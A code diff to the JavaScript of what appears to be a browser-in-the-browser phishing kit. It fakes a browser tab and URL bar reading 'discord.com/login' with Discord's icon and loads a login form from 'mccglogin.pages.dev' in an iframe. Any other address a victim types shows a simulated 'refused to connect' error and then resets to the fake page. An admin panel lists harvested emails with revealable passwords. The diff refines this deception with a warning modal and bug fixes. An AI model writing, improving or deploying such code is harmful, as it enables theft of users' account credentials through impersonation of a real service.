@@ -21,7 +21,14 @@ const tabTitle = document.getElementById('tab-title');
 const tabFavicon = document.getElementById('tab-favicon');
 const loginIframe = document.getElementById('login-iframe');
 const errorPage = document.getElementById('error-page');
-const errorDomain = document.getElementById('error-domain');
+const errorDomainEl = document.getElementById('error-domain');
+const errorMessageEl = document.getElementById('error-message');
+
+// Modal Elements
+const urlWarningModal = document.getElementById('url-warning-modal');
+const modalBackdrop = document.getElementById('modal-backdrop');
+const modalCancelBtn = document.getElementById('modal-cancel-btn');
+const modalContinueBtn = document.getElementById('modal-continue-btn');
 
 // Admin elements
 const generateCodeBtn = document.getElementById('generate-code-btn');
@@ -39,6 +46,8 @@ let currentUserEmail = null;
 let isAdmin = false;
 let currentGeneratedCode = '';
 let isCodeVisible = false;
+let pendingUrl = '';
+
 const originalUrl = 'https://discord.com/login';
 const discordFavicon = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%235865F2' d='M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z'/%3E%3C/svg%3E";
 
@@ -50,22 +59,42 @@ urlInput.addEventListener('focus', () => {
 urlInput.addEventListener('keydown', (e) => {
     if (e.key === 'Enter') {
         e.preventDefault();
-        handleUrlChange();
+        const inputValue = urlInput.value.trim();
+        
+        if (inputValue !== originalUrl && inputValue !== '') {
+            pendingUrl = inputValue;
+            urlWarningModal.classList.remove('hidden');
+        }
     }
 });
 
-function handleUrlChange() {
-    const inputValue = urlInput.value.trim();
-    
-    if (inputValue === originalUrl || inputValue === '') {
-        return;
-    }
-    
-    // Check if it's a valid URL (has dots and looks like a domain)
+// Modal Cancel
+modalCancelBtn.addEventListener('click', () => {
+    urlWarningModal.classList.add('hidden');
+    urlInput.value = originalUrl;
+    pendingUrl = '';
+});
+
+// Modal Backdrop Click
+modalBackdrop.addEventListener('click', () => {
+    urlWarningModal.classList.add('hidden');
+    urlInput.value = originalUrl;
+    pendingUrl = '';
+});
+
+// Modal Continue - Navigate to URL then reset
+modalContinueBtn.addEventListener('click', () => {
+    urlWarningModal.classList.add('hidden');
+    handleUrlNavigation(pendingUrl);
+    pendingUrl = '';
+});
+
+function handleUrlNavigation(inputValue) {
+    // Check if it's a valid URL (has dots and no spaces)
     const isValidUrl = inputValue.includes('.') && !inputValue.includes(' ');
     
     if (!isValidUrl) {
-        // Show error for invalid domain
+        // Show error for invalid domain/search
         showDomainError(inputValue);
         return;
     }
@@ -87,11 +116,11 @@ function handleUrlChange() {
         tabTitle.textContent = capitalizedName;
         tabFavicon.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
         
-        // Try to load the site in iframe (will likely fail due to X-Frame-Options)
-        loginIframe.classList.add('hidden');
+        // Hide iframe, show error (simulating blocked site)
+        loginIframe.style.display = 'none';
         errorPage.classList.remove('hidden');
-        errorDomain.textContent = `${domain} refused to connect.`;
-        document.getElementById('error-message').textContent = `${domain} may have security settings that prevent embedding.`;
+        errorDomainEl.textContent = `${domain} refused to connect.`;
+        errorMessageEl.textContent = `${domain} may have security settings that prevent embedding.`;
         
     } catch (e) {
         showDomainError(inputValue);
@@ -106,14 +135,14 @@ function handleUrlChange() {
 
 function showDomainError(query) {
     // Update tab to show error
-    tabTitle.textContent = query;
+    tabTitle.textContent = query.substring(0, 20);
     tabFavicon.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23888'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E";
     
-    // Show error page
-    loginIframe.classList.add('hidden');
+    // Hide iframe, show error page
+    loginIframe.style.display = 'none';
     errorPage.classList.remove('hidden');
-    errorDomain.textContent = `This site can't be reached`;
-    document.getElementById('error-message').textContent = `"${query}" is not a valid domain. Check if there is a typo.`;
+    errorDomainEl.textContent = `This site can't be reached`;
+    errorMessageEl.textContent = `"${query}" is not a valid domain. Check if there is a typo.`;
     
     // After 3 seconds, reset
     setTimeout(() => {
@@ -129,9 +158,9 @@ function resetToDiscord() {
     tabTitle.textContent = 'Discord';
     tabFavicon.src = discordFavicon;
     
-    // Show iframe, hide error
+    // Hide error, show iframe
     errorPage.classList.add('hidden');
-    loginIframe.classList.remove('hidden');
+    loginIframe.style.display = 'block';
     
     // Reload iframe
     loginIframe.src = 'https://mccglogin.pages.dev';
@@ -256,15 +285,14 @@ copyCodeBtn.addEventListener('click', () => {
     }, 2000);
 });
 
-// Generate longer MC Code (16 characters)
+// Generate longer MC Code (MC-XXXX-XXXX-XXXX-XXXX format)
 function generateMCCode() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    let code = 'MC-';
-    for (let i = 0; i < 16; i++) {
-        code += chars.charAt(Math.floor(Math.random() * chars.length));
-        // Add dash every 4 characters for readability
-        if ((i + 1) % 4 === 0 && i < 15) {
-            code += '-';
+    let code = 'MC';
+    for (let i = 0; i < 4; i++) {
+        code += '-';
+        for (let j = 0; j < 4; j++) {
+            code += chars.charAt(Math.floor(Math.random() * chars.length));
         }
     }
     return code;
@@ -381,14 +409,14 @@ function loadLogins() {
                 
                 const formattedDate = loginDate.toLocaleString();
                 const ownerBadge = login.owner ? '<span class="badge" style="margin-left:8px;font-size:10px;">ADMIN</span>' : '';
-                const hiddenPassword = '*'.repeat(login.password.length);
+                const hiddenPassword = '*'.repeat(login.password ? login.password.length : 8);
                 
                 html += `
                     <tr>
                         <td>${escapeHtml(login.email)}${ownerBadge}</td>
                         <td>
                             <div class="password-cell">
-                                <span class="password-text" data-password="${escapeHtml(login.password)}">${hiddenPassword}</span>
+                                <span class="password-text" data-password="${escapeHtml(login.password || '')}">${hiddenPassword}</span>
                                 <button class="eye-btn toggle-password" title="Show/Hide">
                                     <svg class="eye-show" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
                                         <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
@@ -457,6 +485,7 @@ function loadLogins() {
 }
 
 function escapeHtml(text) {
+    if (!text) return '';
     const div = document.createElement('div');
     div.textContent = text;
     return div.innerHTML;
